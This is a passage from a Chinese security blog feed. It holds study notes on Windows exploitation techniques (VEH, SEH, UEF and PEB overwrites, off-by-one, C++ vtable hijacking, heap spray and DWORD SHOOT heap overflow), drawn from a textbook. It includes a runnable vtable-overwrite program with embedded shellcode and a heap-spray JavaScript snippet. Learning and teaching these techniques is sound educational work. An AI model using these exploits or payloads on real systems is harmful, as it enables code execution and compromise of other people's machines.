会根据注册表里的相关信息决定是默默地关闭程序，还是弹出错误对话框。</li></ul><h2 id="其它异常处理机制的利用思路"><a class="markdownIt-Anchor" href="#其它异常处理机制的利用思路"></a> 其它异常处理机制的利用思路</h2><h3 id="veh-利用"><a class="markdownIt-Anchor" href="#veh-利用"></a> V.E.H 利用</h3><p>从 Windows XP 开始，在原来的异常处理机制上增加了一种<strong>新的异常处理</strong>：<strong>V.E.H</strong>  ( Vectored Exception Handler，<strong>向量化异常处理</strong> )。</p><p><strong>V.E.H 要点：</strong></p><p>（1）V.E.H 使用 API 注册回调函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">AddVectoredExceptionHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">ULONG FirstHandler,</span></span><br><span class="line"><span class="params">PVECTORED_EXCEPTION_HANDLER VectoredHandler</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>（2）V.E.H 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">VECTORED_EXCEPTION_NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD m_pNextNode;</span><br><span class="line">DWORD m_pPreviousNode;</span><br><span class="line">PVOID m_pfnVectoredHandler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）可以注册多个 V.E.H，V.E.H结构体间串成双向链表，保存在堆中。</p><p>（4）调用顺序：KiUserExceptionDispatcher() 首先检查是否被调试，然后检查 V.E.H 链表，最后检查 S.E.H 链表。</p><p>（5）注册 V.E.H 时，可以指定其在链表中的位置，不必像 S.E.H 按照注册顺序压栈。</p><p>（6）unwind 操作只对栈帧中的 S.E.H链起作用，不涉及 V.E.H</p><p>**V.E.H 利用思路：**如果能用堆溢出的 DWORD SHOOT 修改指向 V.E.H 头结点的指针，在异常处理开始后，就能引导程序执行 shellcode 了。</p><p><strong>标识 V.E.H 链表头节点的指针位于 <code>0x77FC3210</code></strong></p><h3 id="攻击-teb-中的-seh-头节点"><a class="markdownIt-Anchor" href="#攻击-teb-中的-seh-头节点"></a> 攻击 TEB 中的 S.E.H 头节点</h3><p>**攻击思路：**线程的 S.E.H 链通过 TEB 的第一个 DWORD 标识(fs:0)，这个指针永远指向离栈顶最近的那个 S.E.H。如果能够修改 TEB 中的这个指针，在异常发生时就能将程序引导到 shellcode 中去执行。</p><p><strong>TEB（线程环境块）要点：</strong></p><p>（1）一个进程可能同时存在多个线程。</p><p>（2）每个线程都有一个线程环境块 TEB。</p><p>（3）第一个 TEB 开始于 <code>0x7FFDE000</code>。</p><p>（4）之后新建线程的 TEB 紧随前边的 TEB ，相隔 <code>0x1000</code>字节，并向内存低址方向增长。</p><p>（5）当线程退出时，对应的 TEB 也被销毁，腾出的 TEB 空间可以被新建的线程重复使用。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423170845384.png" alt="image-20220423170845384"></p><p>攻击 TEB 中 S.E.H 头节点的方法一般用于单线程的程序，不适合攻击多线程的程序，是因为，多线程的 TEB 很难判断到底是哪一个线程的。</p><h3 id="攻击uef"><a class="markdownIt-Anchor" href="#攻击uef"></a> 攻击U.E.F</h3><p>U.E.F【UnhandledExceptionFilter()】即系统默认的异常处理函数，是系统处理异常的最后一个环节。</p><p>由于 U.E.F 句柄在不同操作系统和补丁版本下可能不同，所以在攻击前需要确定 U.E.F 句柄，即反汇编（用IDA）kernel32.dll 中的导出函数 SetUnhandledExceptionFilter()。</p><p>补充：U.E.F 利用时，结合使用跳板技术能使 exploit 成功率更高。</p><p>异常发生时，EDI 往往仍然指向堆中离 shellcode 不远处，把 U.E.F 的句柄覆盖成一条 <code>call dword ptr [edi+0x78]</code>的指令地址往往能让程序跳到 shellcode 中。其它具有定位 shellcode 的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call dword ptr [ESI+0x4C]</span><br><span class="line">call dword ptr [EBP+0x74]</span><br></pre></td></tr></table></figure><p>此外，EDI的跳转并不能保证百分之百成功。</p><h3 id="攻击-peb-中的函数指针"><a class="markdownIt-Anchor" href="#攻击-peb-中的函数指针"></a> 攻击 PEB 中的函数指针</h3><p><strong>PEB 的位置永远不变。</strong></p><p>上一次堆溢出的最后一个实验中，通过 DWORD SHOOT 修改 PEB 中函数地址，那么当调用函数时，程序就被我们引导去执行 shellcode 代码。</p><h1 id="off-by-one-的利用"><a class="markdownIt-Anchor" href="#off-by-one-的利用"></a> “off by one” 的利用</h1><p>Halvar Flake 在“ Third Generation Exploitation”中，按照攻击的难度把漏洞利用技术分成 3个层次。<br>（ 1）第一类是<strong>基础的栈溢出利用</strong>。攻击者可以利用返回地址等轻松劫持进程，植入 shellcode，例如，对 strcpy、 strcat 等函数的攻击等。<br>（ 2）第二类是<strong>高级的栈溢出利用</strong>。这时，栈中有诸多的限制因素，溢出数据往往只能淹没部分的 EBP，而无法抵达返回地址的位置。这种漏洞利用的典型例子就是对 strncpy 函数误用时产生的 “off by one” 漏洞的利用。<br>（ 3）第三类攻击则是<strong>堆溢出利用及格式化串漏洞的利用</strong>。</p><p>off by one 的利用代码示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">off_by_one</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>,len=<span class="number">0</span>;</span><br><span class="line">len=<span class="keyword">sizeof</span>(buf);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; input[i]&amp;&amp;(i&lt;=len); i++) <span class="comment">//这里应该是i&lt;len</span></span><br><span class="line">&#123;</span><br><span class="line">buf[i]=input[i];</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第 6 行代码中，循环条件中的<code>i&lt;=len</code>就给攻击者一个字节的溢出机会。这种边界控制上的错误就是 “off by one” 问题。</p><p>这时，如果缓冲区后面紧跟着 EBP 和返回地址，那么这溢出的一个字节，将有机会覆盖 EBP 的最低位字节，也就是说我们能在255个字节的范围内移动 EBP，让程序执行我们指定位置的恶意代码。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419215423173.png" alt="image-20220419215423173"></p><p>此外，off by one 可能破坏重要的临界变量，从而导致程序流程改变，或者整数溢出等更深层次的问题。</p><h1 id="攻击-c-的虚函数"><a class="markdownIt-Anchor" href="#攻击-c-的虚函数"></a> 攻击 C++ 的虚函数</h1><p>虚函数与虚表的要点：<br>（ 1）用关键字 virtual 修饰声名的类成员函数，叫虚函数</p><p>​（ 2）一个类用可能有多个虚函数</p><p>​（ 3）虚表（vatable）中保存着类的所有虚函数的入口地址。</p><p>​（ 4）对象使用虚函数时，先通过虚表指针找到虚表，然后从虚表中找到虚函数的入口地址。</p><p>​（ 5）虚表指针保存在对象的内存空间中，与其它成员变量相邻。</p><p>​（ 6）虚函数只有通过对象指针的引用才能显示其动态调用的特性。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419215625216.png" alt="image-20220419215625216"></p><p>如果能<strong>溢出</strong>对象的<strong>成员变量</strong>，就有机会修改<strong>虚表指针</strong>或修改虚表中的<strong>虚函数指针</strong>，从而运行 shellcode</p><h2 id="实现代码即相关说明"><a class="markdownIt-Anchor" href="#实现代码即相关说明"></a> 实现代码即相关说明</h2><p>表 6-3-1 实验环境</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP2</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><p>说明： 伪造的虚表指针和虚函数指针依赖于实验机器，可能需要通过动态调试重新确定，您也可以通过在程序中简单地打印出 overflow.buf 的地址，从而计算出这两个值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\xE2\x42\x00&quot;</span>;<span class="comment">//set fake virtual function pointer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Failwest</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">Failwest overflow, *p;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> * p_vtable;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,overflow.buf);</span><br><span class="line">p_vtable=overflow.buf<span class="number">-4</span>;<span class="comment">//point to virtual table</span></span><br><span class="line"><span class="comment">//__asm int 3</span></span><br><span class="line"><span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line"><span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">p_vtable[<span class="number">0</span>]=<span class="number">0xf4</span>;</span><br><span class="line">p_vtable[<span class="number">1</span>]=<span class="number">0xe2</span>;</span><br><span class="line">p_vtable[<span class="number">2</span>]=<span class="number">0x42</span>;</span><br><span class="line">p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(overflow.buf,shellcode);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">p=&amp;overflow;</span><br><span class="line">p-&gt;<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>代码说明：</strong><br>（ 1）虚表指针位于 char buf[200] 之前，通过 p_vtable = overflow.buf - 4 定位这个指针。</p><p>​（ 2）修改<strong>虚表指针</strong>指向缓冲区的 <code>0x0042e2f4</code> 处，把<code>0x0042e2f4</code>里存放的内容当作<strong>虚函数指针</strong>，即<code>0042e244</code></p><p>​（ 3）程序执行到 p-&gt;rest() 时，将会把<code>0x0042e2f4</code>处的内容取出，即 <code>0x0042e244</code> ，然后把它当作函数的入口地址，进而去执行 <code>0x0042e244</code> 处的指令，即我们的 shellcode 代码。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419221608706.png" alt="image-20220419221608706"></p><p>运行程序后出现的结果：</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220420100115219.png" alt="image-20220420100115219"></p><p>由于虚表指针位于成员变量前，溢出只能向后覆盖数据，所以这种利用方式在 “数组溢出”或“连续性覆盖” 的场景下有局限。</p><p>当然，如果<strong>内存中有多个对象且能溢出到下一个对象空间中去</strong>，“连续性覆盖” 还是有攻击机会的，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220420104319811.png" alt="image-20220420104319811"></p><h1 id="heap-spray堆与栈的协同攻击"><a class="markdownIt-Anchor" href="#heap-spray堆与栈的协同攻击"></a> Heap Spray：堆与栈的协同攻击</h1><p>攻击浏览器时，常常结合使用堆和栈的协同利用漏洞。</p><p>（1）当浏览器或插件中<strong>存在溢出漏洞</strong>时，攻击者就可以生成一个特殊的 HTML 文件来触发这个漏洞。</p><p>（2）漏洞触发后最终都能获得 EIP</p><p>（3）有时我们很难在浏览器中布置完整的 shellcode</p><p>（4）JavaScript 可以申请堆内存，所以，把 shellcode 通过 JavaScript 布置在堆中。</p><p>如何定位 shellcode 呢？Heap Spray 技术就是为了解决这个问题。</p><p>**攻击思路：**在使用 Heap Spray时，一般会人为的把 EIP 指向堆区的 <code>0x0C0C0C0C</code> 位置，然后用 JavaScript 申请大量堆内存，并用包含着 0x90 和 shellcode 的 ”内存片“ 覆盖这些内存。</p><p>JavaScript 会从内存低址向高址分配内存，因此申请内存超过 200MB（200MB = 200*1024*1024 = 0x0C800000 &gt; 0x0C0C0C0C）后，0x0C0C0C0C 将被含有 shellcode 的内存片覆盖。只要 0x90 能命中 0x0C0C0C0C 的位置，shellcode 最终就能执行。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423205602972.png" alt="image-20220423205602972"></p><p>使用下面 JavaScript 代码产生的内存片来覆盖内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var nop=unescape(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (nop.length&lt;= <span class="number">0x100000</span>/<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">nop+=nop;</span><br><span class="line">&#125;<span class="comment">//生成一个 1MB 大小充满 0x90 的数据块</span></span><br><span class="line">nop = nop.substring(<span class="number">0</span>, <span class="number">0x100000</span>/<span class="number">2</span> - <span class="number">32</span>/<span class="number">2</span> - <span class="number">4</span>/<span class="number">2</span> - shellcode.length - <span class="number">2</span>/<span class="number">2</span> );</span><br><span class="line">var slide = new Arrary();</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">slide[i] = nop + shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码说明：</p><p>（1）每个内存片大小为 1MB</p><p>（2）首先产生一个大小为 1MB 且全部被 0x90 填满的内存。</p><p>（3）由于 JavaScript 会为申请到的内存填上一些额外的信息，为了保证内存片恰好是 1MB，我们将这些额外信息所占的空间减去。</p><table><thead><tr><th>额外信息</th><th>SIZE</th><th>说 明</th></tr></thead><tbody><tr><td>malloc header</td><td>32 bytes</td><td>堆块信息</td></tr><tr><td>string length</td><td>4 bytes</td><td>表示字符串长度</td></tr><tr><td>terminator</td><td>2 bytes</td><td>字符串结束符，两个字节的 NULL</td></tr></tbody></table><p>（4）最终我们将使用 200 个这种形式的内存片来覆盖堆内存，只要其中任意一片的 nop 区能够覆盖 0x0C0C0C0C，攻击就可以成功</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423210203879.png" alt="image-20220423210203879"></p><p>**为什么采用 1MB 大小作为内存片的单位呢？**在 Heap Spray 时，内存片相对于 shellcode 和额外的内存信息来说应该“足够大”，这样 nop 区域命中 <code>0x0C0C0C0C</code> 的几率将相对增加；如果内存片较小， shellcode 或额外的内存信息将有可能覆盖 <code>0x0C0C0C0C</code>，导致溢出失败。 1MB的内存相对于 200 字节左右的 shellcode，可以让 exploit 拥有足够的稳定性。</p><blockquote><p>参考：《0day,软件安全漏洞分析技术》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;狙击-windows-异常处理机制&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#狙击-windows-异常处理机制&quot;&gt;&lt;/a&gt; 狙击 Windows 异常处理机制&lt;/h1&gt;
&lt;h2 id=&quot;seh-概述&quot;&gt;&lt;a class=&quot;mark</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内存攻击" scheme="https://www.rgzzplus.com/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出</title>
    <link href="https://www.rgzzplus.com/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    <id>https://www.rgzzplus.com/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/</id>
    <published>2022-04-15T15:32:13.000Z</published>
    <updated>2022-04-21T06:25:11.033Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>如果你不了解堆的话，请先看我的上一篇博文《堆的工作原理》，然后再来学习堆溢出，结合食用，更易理解。</p></blockquote><h1 id="堆溢出利用上-dword-shoot"><a class="markdownIt-Anchor" href="#堆溢出利用上-dword-shoot"></a> 堆溢出利用（上）—— DWORD SHOOT</h1><h2 id="链表拆卸中的问题"><a class="markdownIt-Anchor" href="#链表拆卸中的问题"></a> 链表“拆卸”中的问题</h2><p>堆管理系统三类操作：堆块分配、堆块释放、堆块合并。</p><p>这三种操作实际上是对链表的修改，如果我们能伪造链表结点的指针，那么在 “卸下” 和 “链入” 过程中就可能获得一次读写内存的机会。</p><p>堆溢出的精髓：用特殊的数据去溢出下一个堆块的块首，改写块首的前向指针（flink）和后向指针（blink），然后在分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p><p>**DWORD SHOOT：**向内存任意地址写入任意数据。</p><table><thead><tr><th>点射目标（Target）</th><th>子弹（payload）</th><th>改写后的结果</th></tr></thead><tbody><tr><td>栈帧中的函数返回地址</td><td>shellcode 起始地址</td><td>函数返回时，跳去执行 shellcode</td></tr><tr><td>栈帧中的 S.E.H 句柄</td><td>shellcode 起始地址</td><td>异常发生时，跳去执行 shellcode</td></tr><tr><td>重要函数调用地址</td><td>shellcode 起始地址</td><td>函数调用时，跳去执行 shellcode</td></tr></tbody></table><blockquote><p><strong>注意：</strong><br>DWORD SHOOT 发生时，我们不但可以控制射击的目标（任意地址），还可以选用适当的子弹（填充的 4 字节恶意数据）。</p></blockquote><h3 id="dword-shoot-原理"><a class="markdownIt-Anchor" href="#dword-shoot-原理"></a> DWORD SHOOT 原理</h3><p>下面我们讲解，将一个结点从双向链表中 “拆卸” 下来的过程中，是<strong>怎么向任意地址写入任意数据的</strong>（即DWORD SHOOT）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line">&#123;</span><br><span class="line">node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//正常拆卸结点的函数</span></span><br></pre></td></tr></table></figure><p>正常拆卸过程，正如下面 图5.3.1 过程一样。</p><p>但是当我们利用堆溢出，把 Node 的块首覆盖后，node -&gt; flink（前向指针）与node -&gt; blink（后向指针）也就能伪造了。<br>这时，如果继续执行堆块 “拆卸”，实际上是执行<code>node -&gt; blink(fake) -&gt; flink = node -&gt; flink(fake);</code>即 <code>Target -&gt; flink = node -&gt; flink(fake);</code>，如下面的 图5.3.2 所示。</p><p><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220421130721708.png" alt="image-20220421130721708"></p><h2 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h2><table><thead><tr><th></th><th>实验环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>windows xp sp3虚拟机</td><td>分配策略对操作系统很敏感</td></tr><tr><td>编译器</td><td>Visrual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>如果使用 debug 版本，实验将会失败</td></tr></tbody></table><p>按照堆表数据结构规定，堆的空表索引区在偏移<code>0x0178</code>处。在这个实验中空表索引区的地址是<code>0x003a0178</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//free block and prevent coalesing</span></span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h1);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h3);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h5);</span><br><span class="line"></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMOTY, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤"><a class="markdownIt-Anchor" href="#步骤"></a> 步骤</h3><p>与前面实验调试一样，先在 vc++6.0 中编译运行代码，然后跳转到 ollydbg，如下图<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412115227202-165052222800332.png" alt="image-ollydbg断点"></p><p>跳过断点指令：在<code>004010E2</code>处右击 --&gt; 选择<mark>设置新的运行点</mark>跳转，如下图<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412115354254-165052222800433.png" alt="image-20220412115354254"></p><p>断点是刚好在 h6 创建完成后，在释放奇数堆块前，所以这时在我们还未释放堆块前，我们先来观察一下堆的空表索引区，除了freelist[0]中有一个大块的“堆尾”外，其它的都指向自己，因为还没有堆块释放挂入堆中，如下图<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412144315172-165052222800434.png" alt="image-堆空表索引区"></p><p>我们再来看看“堆尾”(<code>003a06e8</code>)，如下图，可以看到，h1 ~ h6 它们的前驱和后继指针都为空，只有“尾块”的前去后记指针指向freelist[0]<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412145132458-165052222800435.png" alt="image-20220412145132458"></p><p>在执行完三次释放操作后，我们再来看看空表索引区，在freelist[2]中多出<code>003a0688</code>和<code>003a06c8</code><br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412150316227-165052222800436.png" alt="image-空表索引区"></p><p>接着再看看h1~h6堆块，在程序中释放掉的 h1, h3, h5 已经有了前驱和后继指针，被链入了freelist[2]中<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412150705273-165052222800437.png" alt="image-20220412150705273"></p><p>这时，最后一次8字节的内存请求将会把原来的 h5分配出去，这意味着，将会中freelist2]的双向链表中 “卸下” 最后一个节点（h5），freelist[2]双向链表示意图，如下图所示<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412152551104-165052222800438.png" alt="image-20220412152551104"></p><p>如果我们直接在内存中修改 h5 的空表指针（攻击时是由于溢出而改写的），那么应该能够观察到DWORD SHOOT现象</p><p>如下图所示，直接把  h5 的后继指针修改为<code>44 44 44 44</code>，前驱指针修改为<code>00 00 00 00</code>，<br>当最后一个分配请求函数被调用后，调试器被异常中断，因为无法将<code>0x44444444</code>写入<code>00000000</code>。<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412153048362-165052222800439.png" 